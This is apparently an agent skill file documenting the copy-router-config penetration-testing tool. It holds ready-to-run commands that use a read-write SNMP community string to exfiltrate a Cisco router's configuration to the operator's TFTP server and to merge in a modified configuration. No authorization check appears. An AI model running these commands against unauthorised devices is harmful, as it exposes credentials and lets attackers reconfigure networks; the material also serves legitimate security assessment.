---
name: copy-router-config
description: Copy or merge Cisco router configuration files via SNMP. Use when performing vulnerability assessments or exploitation on Cisco networking equipment where SNMP community strings (specifically read-write) have been discovered, allowing for the exfiltration or modification of device configurations.
---

# copy-router-config

## Overview
A set of Perl scripts designed to interact with Cisco devices using the SNMP protocol to either exfiltrate (copy) or modify (merge) configuration files. This tool is essential for network-based post-exploitation and vulnerability analysis. Category: Vulnerability Analysis.

## Installation (if not already installed)
Assume the tool is already installed. If the commands are missing, install via:

```bash
sudo apt install copy-router-config
```

Dependencies: `perl-cisco-copyconfig`.

## Common Workflows

### Exfiltrating a Router Configuration
To copy the running configuration from a target router to your local TFTP server:
1. Ensure a TFTP server is running on your machine (e.g., `atftpd` or `tftpd-hpa`).
2. Run the copy script:
```bash
copy-router-config.pl 192.168.1.1 192.168.1.15 private
```
*Where `192.168.1.1` is the router, `192.168.1.15` is your IP, and `private` is the RW community string.*

### Modifying/Merging a Router Configuration
To merge a local configuration file (stored on your TFTP server) into the running configuration of a target router:
```bash
merge-router-config.pl 192.168.1.1 192.168.1.15 private
```

## Complete Command Reference

### copy-router-config.pl
Copies Cisco configs from the device to a TFTP server.

**Usage:**
```bash
copy-router-config.pl <router-ip> <tftp-serverip> <community>
```

| Argument | Description |
|----------|-------------|
| `<router-ip>` | The IP address of the target Cisco router. |
| `<tftp-serverip>` | The IP address of the TFTP server where the config will be sent. |
| `<community>` | The SNMP Read-Write (RW) community string. |

### merge-router-config.pl
Merges a config file from a TFTP server into the Cisco device's current configuration.

**Usage:**
```bash
merge-router-config.pl <router-ip> <tftp-serverip> <community>
```

| Argument | Description |
|----------|-------------|
| `<router-ip>` | The IP address of the target Cisco router. |
| `<tftp-serverip>` | The IP address of the TFTP server containing the source config file. |
| `<community>` | The SNMP Read-Write (RW) community string. |

## Notes
- **TFTP Setup**: You must have a TFTP server properly configured and reachable by the target router. It is recommended to run the TFTP server from `/tmp` or ensure the directory has appropriate write permissions for the `tftp` user.
- **SNMP Permissions**: These scripts require an SNMP community string with **Read-Write (RW)** privileges. Standard Read-Only (RO) strings like `public` will typically fail to trigger the configuration copy OIDs.
- **Security**: Be aware that transferring configurations via TFTP is unencrypted; sensitive data like enable passwords or secrets may be visible in transit if the network is being sniffed.